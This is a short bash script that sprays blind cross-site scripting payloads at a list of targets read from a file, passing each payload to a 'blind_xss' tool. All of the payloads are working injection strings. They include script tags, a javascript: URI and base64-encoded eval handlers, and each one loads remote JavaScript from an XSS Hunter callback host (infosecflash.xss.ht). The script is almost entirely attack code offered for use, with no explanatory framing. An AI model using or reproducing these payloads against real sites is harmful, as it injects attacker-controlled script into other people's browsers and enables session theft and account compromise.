allThreads=("\"><script src=https://infosecflash.xss.ht></script>" "javascript:eval('var a=document.createElement(\'script\');a.src=\'https://infosecflash.xss.ht\';document.body.appendChild(a)')" "\"><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vaW5mb3NlY2ZsYXNoLnhzcy5odCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs\&\#61; autofocus>" "\"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vaW5mb3NlY2ZsYXNoLnhzcy5odCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs\&\#61; onerror=eval(atob(this.id))>" "\"><video><source onerror=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vaW5mb3NlY2ZsYXNoLnhzcy5odCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs\&\#61;>" "<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener(\"load\", b);a.open(\"GET\", \"//infosecflash.xss.ht\");a.send();</script>" "<script>$.getScript(\"//infosecflash.xss.ht\")</script>") 

while read -r line;
      do for i in "${allThreads[@]}"
         do 
            /var/root/go/bin/blind_xss $line "$i" $2
         done         
      done < $1
